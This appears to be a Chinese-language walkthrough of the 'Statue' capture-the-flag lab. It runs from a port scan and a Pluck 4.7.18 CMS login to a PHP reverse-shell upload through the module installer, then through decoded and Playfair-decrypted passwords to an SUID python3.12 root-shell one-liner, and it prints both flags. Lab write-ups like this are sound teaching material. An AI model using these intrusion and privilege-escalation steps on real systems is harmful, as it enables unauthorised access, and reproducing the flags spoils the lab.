# Statue

2025.03.03 https://thehackerslabs.com/statue/

[video](https://www.bilibili.com/video/BV1UE9YY7Exh/?spm_id_from=333.1387.upload.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 80 可以 Index 目录，但是空目录。将 statue.thl 添加到 hosts。

web 目录扫描，发现登陆页面 http://statue.thl/login.php 版本 pluck 4.7.18 ， 有 RCE 漏洞，但是需要密码。

发现 http://statue.thl/README.md 显示的是 base64，经过 17 次 base 解码，得到 fideicomiso 就是上面 cms 的密码，http://statue.thl/admin.php?action=installmodule 在这个页面上上传 zip 包，里面是 php shell 反弹文件（shell 的文件名和 zip 包的文件名保持一致），上传成功后，就在 kali 上得到了反弹的 shell。

访问下面这个 url 也可以触发反弹:

```
http://statue.thl/data/modules/8888/8888.php
```

发现 /var/www/Charles-Wheatstone/pass.txt:

```
bash-5.2$ cat /var/www/Charles-Wheatstone/pass.txt
Pass KIBPKSAFMTOIQL

Key Vm0xd1MyUXhVWGhYV0d4VFlUSm9WbGx0ZUV0V01XeHpXa2M1YWxadFVuaFZNVkpUVlVaYVZrNVlW
bFpTYkVZelZUTmtkbEJSYnowSwo=
```

将 Key 经过 7 次 base64 解码得到 guardar ，同时发现 Charles-Wheatstone 发明了 Playfair cipher 加密方法，经过 Playfair cipher 解密后 http://www.online.crypto-it.net/eng/playfair.html 得到 INCOMPRENSIBLE 要将密码转换成小写 incomprensible 成功切换到 charles。

在 home 目录中查看一下这个程序的可见字符串，juan 是用户名，进行逆向，发现 generador 可能是密码：

```
s = "juan";
var_28h = "generador";
encrypt_decrypt("juan", (int64_t)&var_30h);
encrypt_decrypt(var_28h, (int64_t)&var_38h);
```

使用 切换到 juan，拿到了 user flag：

```
juan@TheHackersLabs-Statue:~$ cat user.txt
42d6174fddbf1ff96b645cd7a8f6d270
```

sudo -l 显示 (ALL) NOPASSWD: ALL 可以直接提权到 root。

这里也可以直接提权，发现 suid 程序 /usr/bin/python3.12 直接提权到 root：

```
bash-5.2$ /usr/bin/python3.12 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# cd /home
# cd juan
# ls
binario  user.txt
# cat user.txt
42d6174fddbf1ff96b645cd7a8f6d270

# cd /root
# ls
root.txt
# cat root.txt
0284c6ac58cb47bb52e427007beee58e0132bf71
```
